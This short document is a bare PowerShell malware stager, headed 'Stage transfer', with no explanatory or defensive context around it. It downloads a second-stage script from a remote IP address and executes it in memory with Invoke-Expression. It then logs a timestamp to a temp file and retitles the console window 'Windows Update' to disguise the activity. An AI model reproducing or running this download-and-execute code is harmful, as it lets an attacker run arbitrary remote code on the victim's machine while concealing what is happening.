
<# Stage transfer #> $DownloadUrl = "https://192.0.2.164/stage2.ps1"; IEX (Invoke-WebRequest -Uri $DownloadUrl -UseBasicParsing).Content; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append; $Host.UI.RawUI.WindowTitle = "Windows Update"
